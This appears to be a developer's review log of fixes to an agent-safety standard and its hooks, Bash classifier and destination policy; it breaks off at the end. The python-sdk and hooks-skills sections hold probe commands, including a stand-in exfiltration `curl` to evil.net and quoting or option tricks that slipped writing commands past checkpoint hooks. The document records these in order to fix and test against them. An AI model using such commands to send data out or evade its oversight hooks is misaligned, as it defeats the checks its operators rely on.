# Phase 4: whole-change review

The whole change (`git diff origin/main...HEAD`) reviewed by area. Each
issue was verified independently before it was fixed; an issue that did not
hold is recorded with the evidence.

## Round 1 — standard-text, findings, docs-site, other

34 issues (two pairs were reported twice: spec/CHANGELOG.md, issues 16 and
28; the snapshot figures, issues 23 and 32). All real; none rejected. Where
code or a fixture changed, the test that would have caught the issue is
named.

### Standard text

1. **§5.21.3: a call's C was its single capability (medium).** Real: both
   reference layers raise for every capability of the call
   (`grounded.ts` `for (const c of capabilities) raise(...)`,
   `mapper._apply_profiles`), the text keyed on one id, and no vector had
   `additional_capabilities`. Fix: §5.21.3 makes each capability the call
   performs a C in turn, at the call's effective risk R ("Each applied
   profile raises, for each C, at R"). New `calls` vectors in
   `tests/conformance/profiles/effective.json` (six: `block_autonomous` and
   `checkpoint_policy` naming an additional capability, the primary one
   alone, no profile, and two pinning R as the call's risk), run by the
   adapter's mapper (`tests/test_profiles.py::test_call_vector`), the
   Standard Agents binding's `groundedTool` (`test/profiles.test.ts`, a stub
   core computing §5.21.3 per capability; mutation-checked: raising only the
   primary capability fails two vectors) and the core's per-capability
   answers joined in `packages/acs-core/test/profiles.test.ts`.
2. **Composite that invokes a send under a destination policy (medium).**
   Real: the rule was in SECURITY.md and the adapter (F504) only. Fix: a
   new §5.18.4 bullet (a layer that does not see nested calls refuses, under
   a policy, a composite whose `invokes` reach a `send` binding, F504,
   before approval and the checkpoint; one that sees them checks each nested
   send's destination) and the §5.18.10 `send` row names it. Call fixtures
   gain `destination_policy` and `without` (schema, both runners, §10.4,
   CONFORMANCE.md): `composite_send_unseen_under_policy` (`without:
   [nested_calls]`, played by the adapter on both routes) and
   `composite_send_seen_under_policy` (`needs: [nested_calls]`, played by
   the binding). 30 call fixtures.
3. **§5.19.1 gave every invoke step `evidence_anchors: []` (medium).** Real
   (`grounding_invoke_fills_anchors` ends with the nested run's anchors).
   Fix: the row says `[]`, or under `grounding@1` the anchors of the outputs
   the nested run stored (§5.20).
4. **§5.14 Attendance and §5.10 W606 omitted the profile person (medium).**
   Real (`profile_person_unattended_deferred`, `_fails`). Fix: both name a
   step an applied profile requires a person for beside the always-ask
   case; §5.10 also says W606 for a mandate that cannot cover the step.
5. **§5.21.1 listed F501, W606 and W608 only (medium).** Real, reproduced:
   one literal `delegate` step in a 1.2 workflow without `agents` gives
   W621; `block_autonomous: [delegate]` or `require_review: medium` clears
   it. Fix: "every rule that reads effective flags (F501, W606, W608 and
   W621)". New validator fixture `pass_profile_delegation_approved` with
   `tests/fixtures/profiles/block_delegate.profile.yaml`, expecting no
   warning (W621 without the profile).
6. **§5.18.8's code table left out output refusals (medium).** Real. Fix:
   the table is the codes a call is refused with before it runs (F504 now
   names the destination it cannot tell and persist/audit secrets), and a
   second table gives the output refusals: R402, F505, F504 (minimum
   confidence).
8. **Three wrong cross-references (low).** Real. §5.21.3 now cites §5.2.2,
   §12.5 cites §5.12, §6.7 cites §5.18.10.
9. **§9.6 F504 read as exhaustive (low).** Real. "Policy constraint
   violated, including: ..." with a quorum requirement not met (§5.16) and a
   destination a layer cannot tell.
10. **§11.5 listed the `grounding` field as a W616 feature (low).** Real
    (`pass_grounding_key_in_1_1_warn` pins W604 alone). The row says
    "`grounding@1`, with its workflow field `grounding` (the field without
    the extension is an unknown field, W604, §5.20)".
11. **§5.18.1 typed `control` as boolean (low).** Real (schema `const:
    true`; both loaders S303 on `false`). The row's type is `true`, with
    "`false` is S303, and the record is not loaded"; `capability` is
    required unless `control` is present.
12. **§6.4's timestamp ignored resumption updates (low).** Real by the text
    of §5.14.1 item 6. §6.4 adds the decision time of a queued record a
    resumption decides or supersedes.
13. **§2's effective flag predated profiles and target maxima (low).**
    Real. The definition names the baseline (ontology or a delegation's
    target maxima, §5.15.2), profile raises (§5.21.3) and, for a call,
    §5.18.1.
14. **"targets 1.2" beside "targets 1.2 or later" (low).** Real; the code
    gates on `>= (1, 2)` throughout (`targets_1_2`, no `== (1, 2)`). Eleven
    places now say "1.2 or later".
15. **Small factual mismatches (low).** Real. (a) an `Error` carries its
    `kind` and `code` and may carry `message` (default empty) and `reason`
    (the site's `response-replay` slot, anchored on that paragraph's first
    words, follows);
    (b) the `acs:` index bound is 2^53 − 1, "the integer bound RFC 7493
    §2.2 recommends, one below §5.14's"; (c) §11.4 says "in 1.1.0".
21. **ACS-17: `name:tag` identifiers gave the tag or no family (medium).**
    Real, reproduced (fictional `acme:latest` → `latest`, `acme:7b` → none, in
    Rust, Python and TypeScript). Fix in all three (`core/src/names.rs`,
    `grounded_agency/coordination/families.py`,
    `packages/acs-core/src/families.ts`) and in §5.15's rule: step 2 cuts
    only at a `.` or `:` followed by a letter, and, when the part has no
    digit or `-`, only at a `.` (a `:` there starts a tag). The change only
    affects identifiers that gave a tag or no family; every earlier vector
    holds. New vectors in `tests/conformance/families/derive.json`
    (`acme:latest`, `acme:7b`, `acme:8x7b`, `acme:instruct`, `acme3:latest`,
    `acme-coder:6.7b`, `vendor/acme:latest`, `vendor.acme:latest`,
    `us.acme:7b`, `vendor:acme-large-2`, `acme.7`) and the Rust unit test.
    The limit is stated: a tag that starts with a letter and holds a digit
    (`acme:v1.6`) cannot be told from a provider prefix (`vendor:acme-2`) and
    gives `v`; RFC-0007's open question 8 names it. The guide, RFC-0007 §6
    and the ACS-17 resolution follow.
25. **1.2 features gated by target inconsistently (low).** Real: `scope`,
    `continues`, `read_only` and the approver fields were gated on the 1.2
    target, `require_record` was not, so a 1.1 workflow binding it failed
    R402 where 1.1 passed the input on. Fix: `machine.rs` reads
    `require_record` only in a workflow that targets 1.2 or later (a 1.1
    run is as before); §6.4 says so, and §11.5 states the rule: an executor
    applies a 1.2 feature only to a 1.2-or-later target, except a declared
    extension's check (`grounding@1`, kept applied) and a qualified invoke
    target the host gives a catalog for. New runtime fixture
    `audit_require_record_v11_unchecked` (completes on `recorded: false`);
    the Rust test `require_record_fails_an_audit_step_that_did_not_record`,
    which used a 1.1 workflow, now checks both targets (1.1 completes, 1.2
    fails R402 `not_recorded`); the guide and the audit skill say so.

### Findings

22. **ACS-05 and nine compliance documents said the adapter checks only
    served tools (low).** Real since b3cdc7e. The resolution, the
    `GroundedAgentConfig.profiles` docstring, the comment on
    `_grounded_tools`, two CHANGELOG entries and the shared paragraph of the
    nine compliance documents now say: a served tool checks its own result,
    the PostToolUse hook another server's bound MCP tool, and Claude Code's
    own tools carry no capability output and get a one-time warning.
23. **ACS-43, ACS-60 and the snapshot size model cited old figures (low;
    with issue 32).** Real. ACS-43 pins 1.2.0/2.2.0 (1.1.0/2.1.0 when
    fixed); ACS-60 says 39 kinds in 1.2.0. Re-measured over the 351 runtime
    fixtures (each played with `tests/runtime_replay.play`, then
    `len(run.snapshot()["state"])`): 1.2 to 34.8 kB, median 2.8 kB, the
    trace a mean 42% of a snapshot (47% of all bytes together); after
    `take_trace` and `take_records`, 1.0 to 11.8 kB, median 1.5 kB. The two
    reviewers' second figures differed (13.6 vs 11.8 kB); this measurement
    agrees with 11.8. The guide says 351, median 2.8 kB, and the 47%.

### Docs site

24. **ACS-35: the event-driven recipe restored without an actor (low).**
    Real. The recipe passes `actor_identity=actor` and says why (§5.17),
    and that a run started without one is restored without one.
27. **/spec/'s coverage figure ignored binding and call fixtures
    (medium).** Real. `conformanceSuite()` gains the binding fixtures
    (expected error and warning codes) and the call-sequence fixtures (each
    call's refusal, nested calls included); `site/test/index-figures.test.ts`
    checks both parts against the files and that V110, V111, F506 and W617
    are expected. The missing list becomes V103, S301, S302, R407 and W612.
31. **§10.3's suite figure left out `warn_` fixtures (low).** Real. The
    figure counts "Positive fixtures with warnings (warn_)", and
    CONFORMANCE.md's test suite requirements name `tests/fixtures/warn_*`.

### Other

7. **EDGE_TYPES.md contradicted §4.3, §10.2 and §11.6 (medium).** Real.
   L1 checks are MUST and SHOULD be linear; the L3 items are gone (no rule,
   as §4.3 says; nothing checks them); Versioning restates §11.6 (MAJOR for
   `requires`, `precedes`, `conflicts_with` edges, MINOR for the others).
16. **spec/CHANGELOG.md had no 1.2.0 entry (low; with issue 28,
    medium).** Real. The stale Unreleased block is replaced by "v1.2.0
    (Candidate Standard, unreleased)": the six Accepted RFCs, each with its
    Appendix D section, the codes, the conformance additions, the 1.1
    clarifications and RFC-0002 still a Draft.
17. **CONFORMANCE.md listed W607 as uncovered (low).** Real
    (`pass_qualified_invoke_unloaded_warn`); dropped.
18. **RFC-0008 and RFC-0009 cited an executor that cannot see the header
    (low).** Real. Both now say that was so when decided, and that RFC-0010
    §5a has the start operation pass it.
19. **Stale RFC cross-references (low).** Real. RFC-0008 answers "the
    RFC-0005 draft's open question 5 (ACS-Q05)" (verified in
    `origin/main`'s RFC-0005), decision 2 cites ACS-Q05; RFC-0009's scope
    rationale: the dialect allows `pattern` (§4.1.2), and it would be the
    only `pattern` keyword in the ontology's contracts.
20. **SECURITY.md §3.2: a plan before `send` (low).** Real (the ontology
    has `plan precedes execute` and `mutate` only). `send` has its own row:
    checkpoint (required), constrain (recommended).
26. **Upgrading described APIs 1.1 never shipped (low).** Real (no
    `packages/`, no `bindings.py`, no `statement.schema.json`, no
    `recorded_by` on `origin/main`). The TypeScript package, tool binding
    record and statement schema entries move to Added; the
    `recorded_by` digest joins the binding records entry; the `profiles`,
    `catalogs` and `agents` lines say what the operations take, without
    "were refused".
29. **Modality examples used anchors the profiles refuse (medium).** Real,
    reproduced (F505 under the audio profile). The twelve examples of the
    vision, audio and multimodal guides use §6.5 anchors (`kind`, `ref` in
    the modality guide's forms, `acs:` for a value the step was given);
    scores and signal quality are output data. New
    `tests/test_domain_examples.py` checks every "Capability Usage" example
    against its domain profile's grounding policy (four audio examples
    fail on the old text). The site reads an anchor's `kind`.
30. **docs/domains/README.md claimed checkpoints the profiles do not set
    (low).** Real. The vision, audio and multimodal bullets, and each
    guide's Checkpoint Policy list, state the profile's rules (`mutate`,
    `persist`, the risk threshold); the audio guide's safety item and the
    EU AI Act classification no longer claim a checkpoint before speaker
    identification, and say how a deployment adds one.
32. See 23.
33. **User docs pointed to Standard 1.1.0 (low).** Real. QUICKSTART,
    TUTORIAL (spec and §9), FAQ, GLOSSARY, README §5.12, GROUNDED_AGENCY
    §5.8 and the orchestration guide's opening now cite 1.2.0 (the guide's
    table already listed `grounding@1`). The Standard Agents integration
    keeps its 1.1.0 links: it states that the mapping was made against
    1.1.0.
34. **The EU AI Act classification understated multimodal grounding
    (low).** Real; all six capabilities listed.

### Checks after round 1

All green on the final tree:

- Python: every `tools/validate_*.py` of CLAUDE.md, `validate_workflows.py
  --strict`, every domain catalog and example `--strict`; every generator
  with `--check` (`sync_skill_schemas` 107, `gen_runtime_fixtures` 351,
  `gen_call_fixtures` 33 + 30, `gen_trigger_vectors`,
  `gen_standard_agents_binding`, `gen_capability_json_schemas`); ruff check
  and format (CI's list); mypy; `pytest tests/` (4364 passed, 18 skipped);
  `pytest benchmarks/tests/` (69); `scripts/run_conformance.py`.
- Rust (`core/`, 1.99.1; extension rebuilt): fmt; clippy plain, `python`,
  `wasm`; `cargo test --locked` (the timing test included);
  `--features wasm --test wasm` (12); MSRV `cargo +1.88.0 check --locked
  --all-targets --features python`. No expression changed, so the CEL
  differential was not rerun.
- TypeScript: `packages/acs-core` `build:wasm`, build, check, test (1805);
  the binding check and test (191, 2 skipped: the call fixture that needs
  `unbound_calls`, and the one for a layer without nested calls).
- Site: `npm run check`, `npm test` (1172), `npm run build` (check-dist),
  `scripts/check-runs.mjs` (0 enforced runs over 1800px), and
  `scripts/check-axe.mjs` over the 31 pages this round changed (124 runs,
  no violations, no sideways scroll). The built /spec/ caption reads "56 of
  the 61 diagnostic codes ... No fixture or case expects V103, S301, S302,
  R407 and W612", and /spec/1.2.0/'s suite figure counts 8 positive
  fixtures with warnings.

## Round 1 — core-rust, ci-build

Two issues, both in core-rust; both real, none rejected. No ci-build issue
was reported.

1. **WebAssembly `run.start`/`run.resume` defaulted a non-string
   `attendance` or `records` (low).** Real, reproduced: before the fix,
   `run.start` with `options.attendance` `true`, `0`, `{}` or `["actions"]`
   started an attended run, and `records: ["actions"]` gave approvals mode
   (the host loses its per-step records), where `_core.Run.start` raises
   `TypeError` (`core/src/python.rs` takes `&str`). Root cause: optional
   members read with `.and_then(Value::as_str)`, which reads a member of
   the wrong type as one left out. Fix (`core/src/wasm.rs`):
   `optional_string`, left out or `null` is the default, a string as
   before, any other type `bad_request` ("'<key>' must be a string");
   `attendance()` (both operations) and the `records` match use it, and so
   does `key_hex`, which had its own copy of the rule. The same search found
   one more member read that way, `yaml.parse`'s `max_bytes` (a string or a
   negative number fell back to the default limit, where Python's
   `load_yaml` takes `u64`): now `bad_request` unless left out, `null` or a
   non-negative integer. `expr.check`'s per-root `always_present` still
   reads a non-boolean as `false`: no other binding takes that scope, so
   nothing disagrees. The TypeScript package sends only typed strings
   (`wasm.ts`), so its users see no change, and the interface is new on this
   branch (no `core/src/wasm.rs` on origin/main), so there is no Upgrading
   entry. Test: `core/tests/wasm.rs`
   `start_and_resume_refuse_a_non_string_attendance_or_records` (four wrong
   types for each member on start, three on resume, `null` as the default,
   `max_bytes`); it failed before the fix.
2. **No test pinned refusing a decision that arrives after `expires_at`
   (low).** Real, reproduced: with `machine.rs`'s `} else if
   expires_at.is_some_and(|e| now > e) {` mutated to `false && ...` and the
   new fixtures moved away, the lib tests (257), `runtime` (35, all
   fixtures in every mode), `host_protocol` (31) and `effects` (19) all
   pass. The executor was correct. Fix: two runtime fixtures beside
   `approval_expired` in `scripts/gen_runtime_fixtures.py` (`approval_case`
   gains `tail`): `approval_decided_after_expiry`, an approved decision
   submitted at 3600001 with no tick before it, ends Failed F502 with an
   `expired` record (trace `approval_decided`, not `approval_expired`); and
   `approval_decided_at_expiry`, the same decision at 3600000, is in time
   and the mutate runs (Completed), pinning §5.14's "no later than". The
   reviewer's suggested form, `{**approve("d1"), "at": 3600001}`, puts `at`
   inside the response, where the executor ignores it as a member the
   protocol does not define; the fixture format's `at` is a member of the
   script entry (`fixture.schema.json` `act.at`), which every runner passes
   to submit, so the fixture uses that. Mutation checks with the fixtures
   in place: `false && ...` fails `approval_decided_after_expiry` in
   `runtime_fixtures` and `runtime_fixtures_ex_matching`; `now >= e` fails
   `approval_decided_at_expiry` in both. Python (`tests/test_runner.py`)
   and TypeScript through WebAssembly play them too. 353 runtime fixtures;
   the running-workflows guide's snapshot-size paragraph says 353
   (re-measured the same way, every figure unchanged: 1.2 to 34.8 kB,
   median 2.8 kB, trace 42% mean and 47% of all bytes; after taking, 1.0 to
   11.8 kB, median 1.5 kB). The site's counts follow from the files (once
   tracked by git).

### Checks after round 1 (core-rust, ci-build)

- Rust (`core/`, 1.99.1): fmt; clippy plain, `python`, `wasm`; `cargo test
  --locked` (the timing test included); `--features wasm --test wasm` (13);
  MSRV `cargo +1.88.0 check --locked --all-targets --features python`. No
  change reaches the Python extension (`wasm.rs` is behind the `wasm`
  feature; `machine.rs` restored byte for byte after the mutation checks).
- Python: `gen_runtime_fixtures --check` (353), `gen_call_fixtures`,
  `gen_trigger_vectors`, `gen_standard_agents_binding`,
  `gen_capability_json_schemas` and `sync_skill_schemas` `--check`;
  `validate_doc_links`; ruff check and format (CI's list);
  `scripts/run_conformance.py`; `pytest tests/` (4366 passed, 18 skipped).
- TypeScript: `packages/acs-core` `build:wasm`, build, check, test (1811);
  the binding check and test (191, 2 skipped).
- Site: `npm run check`, `npm test` (1172), `npm run build` (check-dist),
  `scripts/check-runs.mjs` (0 enforced runs over 1800px), and
  `scripts/check-axe.mjs` over /guides/running-workflows/, /spec/ and
  /spec/1.2.0/ (12 runs, no violations). The built /spec/ and /spec/1.2.0/
  figures count 353 runtime fixtures, 347 of them expecting actions.

## Round 1 — python-sdk, hooks-skills

Twenty issues: 14 in python-sdk, 6 in hooks-skills. Issues 2 and 14 are
one defect (the Bash destination bypass), recorded once; issues 13 and 12
are one class of defect ("arguments the classifier does not recognise") in
the SDK's reader and the plugin hook's. Nineteen were real and are fixed
(issue 10 was a documentation gap only); one (issue 7) was already resolved
on this branch. Each code fix has a test that fails on the code before it
(checked by restoring the old file and running the test), named below.

The items are by area; the reviewers' issue numbers are, item = issue: 1 =
2 and 14, 2 = 4, 3 = 5, 4 = 6, 5 = 7, 6 = 8, 7 = 9, 8 = 10, 9 = 11, 10 =
13, 11 = 15, 12 = 18, 13 = 20, 14 = 1, 15 = 3, 16 = 12, 17 = 16, 18 = 17,
19 = 19.

### python-sdk

1. **The adapter's destination policy skipped Bash commands not classified
   `send` (high; issue 14 is the same, medium).** Real, reproduced with the
   reviewers' probes (`bash_dest2.py`, `dest_bash.py`, run against this
   tree): under `allowed_destinations`, `curl 'https://evil.net/?q=secret'`,
   `wget`, `gh issue comment`, `git push <url>`, a `curl -d` with a `$(...)`
   and `python3 -c` were `mutate` or `execute` and went to a person, or ran
   with `approval="off"`. Root cause: Bash's worst case was `mutate`, while
   §5.18.3 makes "any request to another system whose effect the binding
   does not know" `send` and applies the worst case to anything the
   classifier does not recognise. Fix (`mapper.py`): `_worst_case()` is a
   gated `mutate` and `send` (`execute` and `send` for an interpreter), used
   for an empty or unreadable line, an always-dangerous pattern, an
   expansion, an unrecognised command and an allow-listed command given an
   argument it does not take as read-only; a change to a remote, registry or
   cluster the command names (`git push`, `npm publish|unpublish`, `docker
   push`, `kubectl delete|apply|patch|edit`) is `mutate` and `send`
   (`_REMOTE_MUTATION_PATTERNS`); the local ones stay `mutate` (`rm`, `git
   stash` forms, ...), so a destination policy refuses exactly the commands
   that may transmit. The existing `_direct_destination_refusal` refuses them
   ("Bash may send, and this layer cannot tell where: a command line names no
   destination it reads"). Tests: `tests/test_adapter_effects.py`
   `test_a_command_that_may_send_is_f504_under_a_policy` (nine commands,
   approval `ask` and `off`; 14 failed before) and
   `test_a_local_command_is_not_checked_against_the_policy`;
   `tests/test_bash_classification.py` `test_the_worst_case_includes_send`.
   Docs: the SDK guide's Bash table and Destination policies, SECURITY.md
   §2.2.9, CHANGELOG Upgrading (Bash bullet).
2. **`IdempotencyLog` replay dropped `evidence_seen` (medium).** Real,
   reproduced: `checkpoint -> send` under an attested `send` policy, the send
   performed through `send_once`, the run restored and the send re-delivered:
   the log replayed `{kind, value}` and the run failed F505 after the
   transmission. Fix (`idempotency.py`): the `done` entry keeps the
   response's `evidence_seen` when present and `_replay` returns it. Tests:
   `tests/test_idempotency.py::test_evidence_seen_is_kept_and_replayed`
   (file-backed, across a restart) and
   `tests/test_runner_effects.py::test_a_redelivered_send_keeps_its_attestation`
   (the reviewer's scenario end to end: completes, one transmission). The
   guide's Sends bullet says the replay carries it.
3. **`IdempotencyLog` passed a delegation that names `replaces` straight to
   the effect (low).** Real, reproduced with
   `delegate_replaces_new_key.json`: after a restore the replacing attempt
   (`run-1:3`, `replaces: t1`) was performed twice. The executor already
   gives a replacing attempt its own key (`machine.rs`, `cur.replaces.is_some()`),
   so the exception bought nothing. Fix: the clause is gone from
   `idempotency.py` and from §4.4.2, which now says the rule applies to such
   a delegation too ("its key is its own, so the rule keeps a re-delivery of
   it from delegating twice and never answers it with the delegation it
   replaces"); RFC-0009 never carried the sentence. Test:
   `tests/test_idempotency.py::test_a_replacing_delegation_is_performed_once_per_key`
   (replays the fixture, snapshots, restores); it replaces
   `test_replaces_and_unkeyed_pass_through`, whose `replaces` half asserted
   the removed behaviour (the unkeyed half is
   `test_an_unkeyed_action_passes_through`).
4. **`performed_since` matched keys by the prefix `<run_id>:` (low).**
   Real, reproduced (`a:3` and `a:1:3` both listed for run `a`). Fix: match
   `key.rpartition(":")[0] == run_id` (`<n>` is digits). Test:
   `test_performed_since_does_not_list_a_run_whose_id_extends_this_one`.
5. **`_core.Run.start` requires `header`, said not to be in the CHANGELOG
   (high).** Not real on this branch: `CHANGELOG.md` [Unreleased] Upgrading,
   "Reference executor, starting a run (Standard 1.2.0 §11.5)", says
   "`_core.Run.start` takes a required keyword-only `header`, the version
   the catalog's `# Standard version:` header declares or `None` for a
   catalog without one; a call without it raises `TypeError`" (added in
   59bef73). The reviewer's `grep -n 'header='` misses it because the text
   names the keyword, not `header=`. Nothing changed.
6. **A gated call without `tool_use_id` is R407, not in Upgrading; the
   demos showed the opposite of their comments (medium).** Real,
   reproduced: `examples/grounded_agent_demo.py` printed R407 under "With
   Checkpoint", `checkpoint_enforcement_demo.py` "with checkpoint: Write:
   blocked" and R407 where its summary says F501. Fixes: (a) both the
   permission callback and the PreToolUse hook report F501 first when no
   valid checkpoint exists (`_unheld_call_refusal`), R407 otherwise; (b) the
   demos pass a context naming each call (`SimpleNamespace(tool_use_id=...)`,
   as `capability_skills_demo.py` does, so they run without the SDK too),
   one id for the PreToolUse hook and the callback of one call, and use a
   fresh checkpoint directory, so a rerun does not find the last run's
   checkpoint under "Without Checkpoint"; the enforcement demo's phase 2
   shows one allowed call and phase 3 that it used the checkpoint, as each
   gated call needs its own; (c) Upgrading says the change. Tests:
   `tests/test_examples_demos.py` runs the three demos twice in one
   directory and checks what they print (failed before on two demos);
   `tests/test_sdk_integration.py::test_context_without_tool_use_id_still_needs_a_checkpoint`
   now pins F501 for the callback and the hook.
7. **`WorkflowDefinition.agents` was inserted before `extra` (low).**
   Real, reproduced. Fix: `agents` moved after `extra`, so positional
   construction is as before; no Upgrading entry needed. Test:
   `tests/test_workflow_engine.py::TestWorkflowDefinitionFromDict::test_positional_fields_keep_their_order`.
8. **Reservation 0 refused, Upgrading said only "at most the expiry"
   (low).** Real as a documentation gap: refusing 0 is intended (a hold that
   lapses at once holds nothing). Upgrading now says both
   `checkpoint_reservation_seconds` and
   `CheckpointTracker(reservation_seconds=...)` must be more than 0, and that
   0 raises `ValueError`.
9. **`git rev-parse` and `git ls-files` became read-only without a note
   (low).** Real. Upgrading's Bash bullet says so, with the other Bash
   changes of this round.
10. **SDK Bash classifier: `$'..'`, `$".."`, brace expansion, `sort
    --compress-program`, abbreviated options (high).** Real, reproduced
    (the reviewer's `obs.py` returned `{}` for `find d $'-delete'` and `sort
    -S 1k --compress-program=sh`). Fixes (`mapper.py`): `_mask_quoted`
    reads the line's quoting, and a `$` outside single quotes (any
    parameter expansion, `$'..'` and `$".."` included) or a brace expansion
    (`{a,b}`, `{1..3}`) gives the worst case; the same reading of the masked
    line marks each simple command whose words hold an unquoted `*`, `?` or
    `[`, which makes `find`, `sort`, `uniq`, `date`, `hostname`, `file`,
    `git`, `less` and `more` not read-only; `sort`, `uniq`, `date`,
    `hostname` and `file` are read-only only with listed options (getopt
    rules: clusters, attached and separate arguments, `--`, and any prefix
    of a long option; a prefix of a writing option writes) and operands
    (`date` only `+FORMAT`, `hostname` none, `uniq` one); `git`'s `--output`
    check takes any abbreviation (`--outp`), and `less -o/-O/--log-file`
    writes. Tests: `tests/test_bash_classification.py`
    `test_arguments_the_classifier_does_not_take_as_read_only` (30
    commands) and `test_read_only_arguments_stay_read_only` (16); 39 tests
    of the file failed on the old mapper. `test_other_forms_are_gated_mutations`
    keeps its `git stash` forms (`mutate` alone) and the three forms the
    classifier does not recognise moved to
    `test_unrecognised_forms_get_the_worst_case` (`mutate` and `send`).
11. **Redactor: structured headers, camelCase names, member names (Python
    and TypeScript, medium).** Real, reproduced in both. Fix
    (`redaction.py`, `redact.ts`, identically): a string member whose name
    ends in a credential name after any prefix (`accessToken`,
    `dbPassword`), or in `authorization` or `cookie` (`Authorization`,
    `Proxy-Authorization`, `Cookie`, `Set-Cookie`), is redacted whole; a
    member name is redacted as text, and a name that would repeat one in
    its object gets ` (2)`, ` (3)`, ... so no member is lost, with the
    pointer of the new name. Five vectors in
    `tests/conformance/secrets/redact.json` (`structured_headers`,
    `camel_case_members`, `secret_member_name`,
    `credential_shaped_member_name`, `colliding_member_names`), run by
    `tests/test_redaction.py` and `packages/acs-core/test/redact.test.ts`
    (all five failed on both old redactors), and the end-to-end
    `tests/test_tool_call_approval.py::TestEvidenceToolInput::test_structured_credentials_in_the_input_are_redacted`
    (`create_evidence_collector(..., include_tool_input=True)`; the export
    held the Basic credential before). Both module comments state the rule.
12. **SDK doc and docstring: grounding and minimum confidence "only for
    `create_grounded_mcp_server` tools" (low).** Real. The SDK guide's
    profile paragraph and `GroundedAgentConfig.grounding`'s docstring now
    say every MCP tool bound to a capability (a served tool checks its own
    result, the PostToolUse hook another server's); the `profiles`
    docstring already said so.
13. **PostToolUse failed open when using the call's hold raised (medium).**
    Real, reproduced with `failopen.py`: with `_persist_state` raising
    ENOSPC after PreToolUse, a result breaking the `mutate` contract was
    passed on with no diagnostic. Fix (`adapter.py`): the hold is used in a
    `try` of its own (logged at ERROR; the result is still checked), and the
    outer handler replaces the result of an MCP tool the hook checks, or
    whose mapping it cannot read (`_may_check_host_result`), with R407
    (`_fail_call`, else the plain text form) instead of returning `{}`.
    Tests: `TestOtherServersOutputs::test_the_result_is_checked_when_its_hold_cannot_be_used`
    (the helper `_call` gains `after_pre` to break the store between the
    hooks) and `test_a_recorder_that_fails_replaces_the_result`; both failed
    before. The SDK guide's PostToolUse line and the hook's docstring say it.

### hooks-skills

14. **Skills' PostToolUse loggers wrote free-form lines and dropped
    failures silently (low).** Real, reproduced (`.audit` a regular file:
    exit 0, nothing logged). §6.4 requires a host's log in action-record or
    event form and a failed capture reported. Fix: the six skills' loggers
    (audit, checkpoint, persist, rollback, send, transform) are removed: the
    plugin's `posttooluse_log_tool.sh`, registered for every tool, already
    logs each call as an HMAC-chained action record and reports a line it
    cannot write (exit 1 with the reason). The texts that called `.audit/`
    "the audit logs" (checkpoint and rollback skills, the guide,
    `snapshots.py`) now name `.claude/` (the plugin's audit log) and
    `.audit/` (where earlier releases' skills logged, still protected from
    checkpoints); the audit skill's live context reads `.claude/audit.log`.
    SECURITY.md §5.4 drops the six logging rows and names the log hook's
    §6.4 behaviour. Tests (`tests/test_skill_hooks.py`) replace the logger
    tests, which tested the removed lines: `test_no_skill_keeps_a_log_of_its_own`
    (six; failed before), `test_the_plugin_log_records_a_digest_and_not_the_input`
    (the same four tool inputs, now through the plugin's hook) and
    `test_a_log_that_cannot_be_written_is_reported`. Upgrading says the
    `.audit/*-operations.log` files are no longer written.
15. **SECURITY.md counted three blocking skill hooks (low).** Real: four
    (audit, persist, rollback, send). The sentence names them, and says what
    the log hook does without `jq` now that the skills' loggers are gone.
16. **PreToolUse hook: quoted, abbreviated and expanded options made a
    writing command `observe` (high).** Real, reproduced in a scratch
    repository: `git log ... "--output=.claude/settings.local.json"`, `git
    diff --out''put=x`, `file '-C' -m f`, `file --compi -m m` all exited 0.
    Fix (`pretooluse_require_checkpoint.sh`): `split_words` splits and
    dequotes the line as bash does (the line already refuses `$`, backticks
    and `\`, so nothing in quotes expands); an unbalanced quote is `mutate`;
    `long_option_of` takes any abbreviation (`git --output`; `file
    --compile`, `--preserve-date`), `file -p` and `-C` in any cluster write,
    and a `git` or `file` command with an unquoted glob character is
    `mutate`. `posttooluse_take_checkpoint.sh` holds the same `split_words`
    (a test keeps them equal), so both hooks read a `git stash create` line
    alike. Tests (`tests/test_hook_lists_match_mapper.py`):
    `test_a_quoted_abbreviated_or_expanded_option_is_gated_in_both` (eleven
    commands, mapper and hook), `test_quoted_and_expanded_read_only_words_stay_read_only`
    and `test_both_checkpoint_hooks_split_words_alike`; 12 failed on the old
    hooks.
17. **Rollback check scanned `used/` and `ended/` with one `jq` per file
    (low).** Real (measured by the reviewer: 3.9 ms a file, a 60 s timeout
    at about 15,600 files). Fix: `posttooluse_take_checkpoint.sh` enters
    each commit it records in `.claude/checkpoints/commits/` (an empty file
    named by the full commit id) before writing the marker; the pre-tool-use
    hook and the rollback skill's command hook look up that one file (or
    the live marker's `commit`), with no time that grows with the history.
    A marker filed under `used/` or `ended/` without its entry no longer
    makes a commit restorable (narrower, never wider). Tests:
    `tests/test_hook_checkpoint_lifecycle.py::test_a_restore_looks_up_one_entry_not_the_history`
    and `test_a_clean_tree_enters_no_commit`;
    `tests/test_skill_hooks.py::TestRollbackCommandHook::test_a_filed_marker_without_its_entry_restores_nothing`.
    The test helpers that planted a marker by hand now enter its commit as
    the take hook does, and `test_an_expired_checkpoint_can_still_be_restored`
    takes its checkpoint through the take hook. hooks/README, SECURITY.md,
    CLAUDE.md and the hook comments say it.
18. **The send skill's address hook missed loopback, link-local, IPv6 and
    numeric forms (low).** Real, reproduced. Fix (`skills/send/SKILL.md`):
    dotted IPv4 in 0/8, 127/8, 10/8, 172.16/12, 192.168/16 and 169.254/16;
    IPv6 literals `[::...]`, `[0:...]`, `[fc..]`/`[fd..]` and
    `[fe8..]`-`[feb..]`; and, as a URL's host (after `://` or `@`), an IPv4
    address with one to three parts or a hex or octal part. A numeric
    argument elsewhere (`--max-time 30`) and canonical public addresses
    pass. Tests: `TestSendCommandHook` gains 15 blocked and 5 allowed
    commands; SECURITY.md §5.4's row lists what is matched (host names stay
    the stated gap).
19. **README's hooks table out of date; hooks/README said the Stop hook
    removes the marker (low).** Real. README.md's table lists the four hooks
    by event and calls the log hook the plugin's action-record log, not an
    `audit` step; hooks/README's Relationship table says the Stop hook files
    the marker under `ended/`.

### Checks after round 1 (python-sdk, hooks-skills)

- Python: ruff check and format (CI's lists); mypy; every
  `tools/validate_*.py` of CLAUDE.md, `validate_workflows.py --strict` and
  every domain catalog and example `--strict`; the generators `--check`
  (`sync_skill_schemas` 107, `gen_runtime_fixtures` 353,
  `gen_call_fixtures` 30, `gen_trigger_vectors`,
  `gen_standard_agents_binding`, `gen_capability_json_schemas`);
  `scripts/run_conformance.py`; `pytest tests/` (4498 passed, 18 skipped);
  `pytest benchmarks/tests/` (69). The reviewers' probes rerun against
  this tree: every Bash command of `bash_dest.py`, `bash_dest2.py` and
